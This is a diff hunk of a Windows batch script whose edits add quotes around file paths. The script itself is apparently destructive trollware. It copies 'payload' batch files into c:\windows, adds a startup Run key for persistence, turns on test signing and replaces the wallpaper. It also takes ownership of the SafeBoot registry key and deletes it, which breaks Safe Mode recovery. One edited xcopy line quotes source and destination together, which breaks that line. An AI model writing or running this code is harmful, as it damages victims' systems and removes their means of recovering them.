@@ -203,15 +203,15 @@ goto BCD
 mkdir c:\windows\fakeexplorer
 mkdir c:\windows\payload
 mkdir c:\windows\wallpapertroll
-xcopy %CD%\junkins\startup\no.bat c:\windows\fakeexplorer /y /q /h
-xcopy %CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat /y /q /h
-xcopy %CD%\junkins\walp\walp.bmp c:\windows\wallpapertroll\walp.bmp /y /q /h
+xcopy "%CD%\junkins\startup\no.bat" "c:\windows\fakeexplorer" /y /q /h
+xcopy "%CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat" /y /q /h
+xcopy "%CD%\junkins\walp\walp.bmp" "c:\windows\wallpapertroll\walp.bmp" /y /q /h
 bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\windows\wallpapertroll\walp.bmp /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv5 /t REG_SZ /d c:\windows\payload\startup.bat
-start %CD%\junkins\startup\SetACL.exe -on name -ot type -actn action
-start %CD%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn setowner -ownr "n:Administrators"
-start %CD%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn ace -ace "n:Administrators;p:full"
+start "%CD%\junkins\startup\SetACL.exe" -on name -ot type -actn action
+start "%CD%\junkins\startup\SetACL.exe" -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn setowner -ownr "n:Administrators"
+start "%CD%\junkins\startup\SetACL.exe" -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn ace -ace "n:Administrators;p:full"
 reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" /f
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
 goto AAAAJJ
